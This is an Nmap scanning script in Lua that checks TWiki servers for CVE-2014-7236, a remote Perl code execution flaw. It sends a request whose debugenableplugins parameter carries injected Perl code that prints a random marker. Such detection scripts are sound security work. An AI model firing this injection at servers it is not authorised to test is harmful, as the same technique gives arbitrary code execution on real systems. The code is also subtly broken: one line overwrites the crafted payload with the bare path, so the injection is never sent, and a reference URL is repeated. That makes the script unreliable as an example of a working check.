local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local base64 = require "base64"

description = [[
Twiki 4.0.x - 6.0.0 allows remote perl code execution via
unsanitized pearl commads via debugenableplugins request parameter.
]]

---
-- @args path . path of twiki installation. '/' default.
-- @usage
-- nmap -p 80 --script=http-vuln-cve2014-7236  <targets>
-- --
-- Scanned at 2015-03-23 05:57:32 IST for 3s
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vulns-cve2014-7236: 
-- |   VULNERABLE:
-- |   TWiki Remote Perl Code Execution vulnerability in versions (4.0.x-6.0.0)
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2014-7236  OSVDB:112977
-- |     Risk factor: High
-- |     Description:
-- |       The debugenableplugins request parameter 
-- |           allows arbitrary Perl code execution.
-- |     References:
-- |       http://www.exploit-db.com/exploits/36438/
-- |       http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-7236
-- |       http://osvdb.org/112977
-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7236
-- Final times for host: srtt: 353 rttvar: 2833  to: 100000

author = {"Gyanendra Mishra"}

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

portrule = shortport.http

action = function(host, port)

  
  local path = stdnse.get_script_args(SCRIPT_NAME .. ".path") or ''

  local vuln_table = {
    title = "TWiki Remote Perl Code Execution vulnerability in versions (4.0.x-6.0.0)",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    references = {
      'http://www.exploit-db.com/exploits/36438/',
      'http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-7236',
      'http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-7236'
    },
    IDS = {
      CVE = 'CVE-2014-7236',
      OSVDB = '112977'
    },
    description = [[The debugenableplugins request parameter 
    allows arbitrary Perl code execution.]]
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local rand = string.lower(stdnse.generate_random_string(18))
  
  local payload =  '/'.. path .. '/do/view/Main/WebHome?debugenableplugins=BackupRestorePlugin%3bprint("Content-Type:text/html\\r\\n\\r\\n'..rand..'!")%3bexit'
  payload = path:gsub('//','/')
  local response= http.get(host,port,payload)
  
  if response.status == 200 and response.body:find(rand) then
    vuln_table.state = vulns.STATE.EXPLOIT
  end    

  return report:make_output(vuln_table)
end